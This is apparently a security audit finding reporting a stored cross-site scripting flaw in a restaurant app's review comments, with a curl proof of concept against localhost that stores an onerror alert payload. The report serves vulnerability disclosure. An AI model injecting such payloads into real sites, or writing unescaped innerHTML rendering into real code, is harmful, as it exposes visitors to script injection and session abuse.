# H1 — Stored XSS in Review Comments (V03)

**Severity:** High  
**CWE:** CWE-79 | **OWASP:** A03:2021  
**Status:** Confirmed  
**Source draft:** `piolium/findings-draft/p7-003-v03-stored-xss-reviews.md`

## Summary

`POST /api/reviews` accepts a `comment` field, stores it verbatim in the `reviews` table, and the SPA renders it via `innerHTML` in the review list view. Stored XSS affects every visitor of the affected menu item.

## PoC

**Step 1 — Store payload (requires session):**
```bash
curl -X POST http://localhost:4443/api/reviews \
  -H "Content-Type: application/json" \
  -H "Cookie: restaurant_session=<alice_session>" \
  -d '{"menu_item_id":1,"rating":5,"comment":"<img src=x onerror=alert(document.domain)>"}'
```

**Step 2 — Trigger on next menu browse:** any user opening the reviews view for menu item 1 executes the script in the same origin.
